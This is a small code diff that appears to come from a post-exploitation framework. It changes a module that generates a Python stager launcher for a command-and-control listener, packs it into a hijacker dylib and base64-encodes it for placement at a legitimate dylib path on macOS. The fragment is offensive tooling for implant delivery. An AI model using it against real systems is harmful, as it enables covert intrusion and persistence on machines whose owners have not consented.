@@ -109,7 +109,7 @@ class Module(object):
         safeChecks = self.options['SafeChecks']['Value']
         arch = self.options['Arch']['Value']
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
-        launcher = launcher.strip('echo').strip(' | /usr/bin/python &').strip("\"")
+        launcher = launcher.strip('echo').strip(' | python3 &').strip("\"")
         dylibBytes = self.mainMenu.stagers.generate_dylib(launcherCode=launcher, arch=arch, hijacker='true')
         encodedDylib = base64.b64encode(dylibBytes)
         dylib = self.options['LegitimateDylibPath']['Value']
